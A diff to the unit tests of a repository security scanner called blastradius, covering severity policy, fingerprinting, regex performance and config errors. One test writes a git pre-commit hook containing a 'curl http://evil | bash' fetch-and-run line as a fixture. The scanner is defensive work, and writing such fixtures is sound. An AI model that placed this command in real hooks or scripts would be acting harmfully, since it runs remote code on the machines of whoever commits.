@@ -206,9 +206,16 @@ class TestPolicy(unittest.TestCase):
             vids = {f.vector_id for f in result.findings}
             self.assertNotIn("go-generate", vids)
             self.assertIn("internal-deploy", vids)
-            npm = [f for f in result.findings
+            # override sets the FLOOR; the malicious base64|sh instance must still
+            # escalate to CRITICAL (policy can raise a floor, not silence a live RCE)
+            mal = [f for f in result.findings
                    if f.vector_id == "npm-lifecycle-script" and f.path == "package.json"]
-            self.assertEqual(npm[0].effective_severity, Severity.LOW)
+            self.assertEqual(mal[0].effective_severity, Severity.CRITICAL)
+            # the benign lifecycle instance follows the low floor
+            benign = [f for f in result.findings
+                      if f.vector_id == "npm-lifecycle-script"
+                      and f.path.endswith("packages/util/package.json")]
+            self.assertEqual(benign[0].effective_severity, Severity.LOW)
         finally:
             shutil.rmtree(work)
 
@@ -253,6 +260,80 @@ class TestNewRenderers(unittest.TestCase):
         # no external scripts/styles
         self.assertNotIn("<script src", out)
         self.assertNotIn("<link ", out)
+
+
+class TestReviewRegressions(unittest.TestCase):
+    """Regressions for defects found by the adversarial review pass."""
+
+    def test_min_severity_does_not_weaken_fail_on_gate(self):
+        # HIGH finding, hidden by --min-severity critical, must still fail --fail-on high
+        from blastradius.cli import main
+        rc = main([str(FIX / "malicious-repo"), "-q",
+                   "--min-severity", "critical", "--fail-on", "high"])
+        self.assertEqual(rc, 1)
+
+    def test_fingerprint_changes_when_scanned_content_changes(self):
+        import tempfile, shutil, stat as _stat, os as _os
+        work = tempfile.mkdtemp()
+        try:
+            hooks = Path(work) / ".git" / "hooks"
+            hooks.mkdir(parents=True)
+            hook = hooks / "pre-commit"
+            hook.write_text("#!/bin/sh\n# comment\necho hi\n")
+            hook.chmod(hook.stat().st_mode | _stat.S_IXUSR)
+            fp1 = {f.fingerprint for f in scan(work).findings}
+            # weaponise the payload BELOW the head — must change the fingerprint
+            hook.write_text("#!/bin/sh\n# comment\necho hi\ncurl http://evil | bash\n")
+            fp2 = {f.fingerprint for f in scan(work).findings}
+            self.assertNotEqual(fp1, fp2)
+        finally:
+            shutil.rmtree(work)
+
+    def test_data_exfil_regex_no_redos(self):
+        # a crafted line that used to blow up the backtracker must return fast
+        import time
+        from blastradius.risk import scan_amplifiers
+        payload = "curl " + ("a" * 5000) + " no_url_here"
+        t0 = time.perf_counter()
+        scan_amplifiers(payload)
+        self.assertLess(time.perf_counter() - t0, 1.0)
+
+    def test_custom_rule_default_glob_matches_root_file(self):
+        import tempfile, shutil
+        from blastradius import policy
+        work = tempfile.mkdtemp()
+        try:
+            (Path(work) / "root.sh").write_text("#!/bin/sh\nBADMARKER here\n")
+            det = policy.build_custom_detectors(
+                [{"id": "r", "pattern": "BADMARKER", "severity": "high"}])  # no files -> default **/*
+            result = scan(work, extra_detectors=det)
+            self.assertTrue(any(f.vector_id == "r" for f in result.findings))
+        finally:
+            shutil.rmtree(work)
+
+    def test_malformed_config_returns_2(self):
+        import tempfile, os as _os
+        from blastradius.cli import main
+        fd, path = tempfile.mkstemp(suffix=".json")
+        with _os.fdopen(fd, "w") as fh:
+            fh.write('{"exclude": "not-a-list"}')
+        try:
+            rc = main([str(FIX / "clean-repo"), "-q", "--config", path])
+            self.assertEqual(rc, 2)
+        finally:
+            _os.unlink(path)
+
+    def test_malformed_baseline_returns_2(self):
+        import tempfile, os as _os
+        from blastradius.cli import main
+        fd, path = tempfile.mkstemp(suffix=".json")
+        with _os.fdopen(fd, "w") as fh:
+            fh.write('["not", "an", "object"]')
+        try:
+            rc = main([str(FIX / "malicious-repo"), "-q", "--baseline", path, "--fail-on", "never"])
+            self.assertEqual(rc, 2)
+        finally:
+            _os.unlink(path)
 
 
 if __name__ == "__main__":
